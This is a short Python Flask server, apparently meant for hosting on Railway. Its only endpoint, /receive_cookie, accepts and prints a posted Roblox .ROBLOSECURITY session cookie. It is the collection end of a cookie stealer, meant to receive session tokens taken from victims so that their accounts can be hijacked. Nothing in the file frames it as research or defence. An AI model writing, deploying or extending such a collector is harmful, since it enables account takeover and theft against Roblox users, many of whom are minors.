from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/receive_cookie', methods=['POST'])
def receive_cookie():
    # Get JSON data from the request
    data = request.get_json(force=True)
    cookie = data.get("cookie")
    
    if cookie:
        # Log the cookie (for example purposes only—avoid logging sensitive info in production)
        print("Received .ROBLOSECURITY cookie:", cookie)
        return jsonify({"status": "success", "message": "Cookie received"}), 200
    else:
        return jsonify({"status": "error", "message": "No cookie provided"}), 400

if __name__ == '__main__':
    # Listen on all interfaces and use the environment's PORT if provided
    # Railway will set the PORT environment variable automatically.
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
